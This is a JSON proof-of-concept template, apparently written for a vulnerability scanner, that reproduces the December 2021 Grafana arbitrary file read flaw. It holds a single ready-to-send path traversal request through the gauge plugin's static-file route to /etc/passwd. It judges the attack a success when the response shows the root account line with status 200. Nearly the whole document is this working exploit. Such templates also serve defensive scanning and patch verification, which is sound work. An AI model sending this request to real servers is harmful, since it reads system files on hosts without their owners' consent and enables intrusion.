{
    "Name": "Grafana任意文件读取漏洞复现",
    "Description": "Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。2021年12月6日，国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件",
    "Product": "Grafana",
    "author": "chumeng",
    "Request":[
                {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/public/plugins/gauge/../../../../../../../../etc/passwd",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": " root:x:0:0:"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
